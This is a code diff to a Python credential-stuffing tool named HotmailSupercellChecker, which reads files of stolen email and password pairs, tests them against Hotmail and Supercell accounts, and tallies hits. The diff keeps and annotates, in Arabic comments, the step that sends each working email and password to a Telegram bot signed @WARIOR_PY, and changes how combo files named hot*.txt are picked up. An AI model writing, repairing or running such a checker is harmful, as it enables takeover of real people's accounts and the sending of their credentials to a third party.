@@ -94,6 +94,7 @@ class HotmailSupercellChecker:
   self.session.verify=False
  def load_combo(self,combo_file):
   if not os.path.exists(combo_file):
+   print(f"{Z}[Combo file not{M}")
    return[]
   combos=[]
   with open(combo_file,'r',encoding='utf-8',errors='ignore')as f:
@@ -108,6 +109,7 @@ class HotmailSupercellChecker:
    for sv in links:
     lk+=f"• {sv}\n"
    ms=f"🔥 𝗛𝗜𝗧 𝗛𝗢𝗧𝗠𝗔𝗜𝗟\n\n📧 Email: {username}\n🔑 Password: {password}\n\n🔗 Services Found:\n{lk}\n\nBy: @WARIOR_PY"
+   # ✅ إصلاح مشكلة إرسال الرسالة
    TB.send_message(CI, ms)
   except Exception as e:
    print(f"{Z}[Telegram Error] {e}{M}")
@@ -215,6 +217,7 @@ class HotmailSupercellChecker:
       with self.lock:
        self.hits+=1
       self.save_result(username,password,"HIT",None,"HIT")
+      # ✅ استدعاء دالة إرسال التلغرام للصيد
       self.send_telegram(username,password,found_links)
       return"HIT"
      else:
@@ -243,10 +246,11 @@ class HotmailSupercellChecker:
    sys.stdout.write(f"\r     {S}{M}Hits:{F}{self.hits:,}{M} | 2FA:{C}{self.twofactor:,}{M} | Custom:{X}{self.custom:,}{M} | Bad:{Z}{self.bad:,}{M} | Retries:{A}{self.retries:,}{S}{M}\n")
    sys.stdout.flush()
   else:
-   pass
+   exit()
  def run_checker(self,combo_file):
   combos=self.load_combo(combo_file)
   if not combos:
+   print(f"{Z}No combos{M}")
    return
   self.total=len(combos)
   start_time=time.time()
@@ -269,55 +273,30 @@ class HotmailSupercellChecker:
       self.print_stats()
       start_time=time.time()
   self.print_stats(running=False)
+from pathlib import Path
 
 def main():
     checker = HotmailSupercellChecker()
-    
-    if len(sys.argv) > 1:
-        combo_files = []
-        for arg in sys.argv[1:]:
-            # Clean argument (remove .txt if present to normalize)
-            clean_arg = arg.replace(".txt", "")
-            # Try to find the file in multiple ways
-            possible_names = [
-                arg, 
-                f"{arg}.txt",
-                f"hot{clean_arg}.txt",
-                f"hit{clean_arg}.txt",
-                clean_arg.replace("hit", "hot") + ".txt",
-                clean_arg.replace("hot", "hit") + ".txt"
-            ]
-            
-            found = False
-            for name in possible_names:
-                if os.path.exists(name):
-                    combo_files.append(name)
-                    found = True
-                    break
-            
-            if not found:
-                print(f"{Z}File not found: {arg}{M}")
-    else:
-        from pathlib import Path
-        base_dir = Path(".")
-        combo_files = sorted(
-            str(f) for f in base_dir.iterdir()
-            if f.is_file() and (f.name.startswith("hot") or f.name.startswith("hit")) and f.suffix == ".txt"
-        )
+
+    base_dir = Path(".")
+    combo_files = sorted(
+        f for f in base_dir.iterdir()
+        if f.is_file() and f.name.startswith("hot") and f.suffix == ".txt"
+    )
 
     if not combo_files:
-        print(f"{Z}No combo files to process.{M}")
+        print(f"{Z}No hot*.txt files found{M}")
         return
 
-    # Removed os.system("clear") to keep logs visible
+    os.system("clear")
     try:
         for combo_file in combo_files:
-            print(f"\n{X}Processing: {combo_file}{M}")
-            checker.run_checker(combo_file)
+            print(f"{X}Processing: {combo_file.name}{M}")
+            checker.run_checker(str(combo_file))
     except KeyboardInterrupt:
-        print("\nInterrupted by user.")
-    except Exception as e:
-        print(f"Error: {e}")
+        pass
+    except Exception:
+        pass
 
 if __name__ == "__main__":
     main()
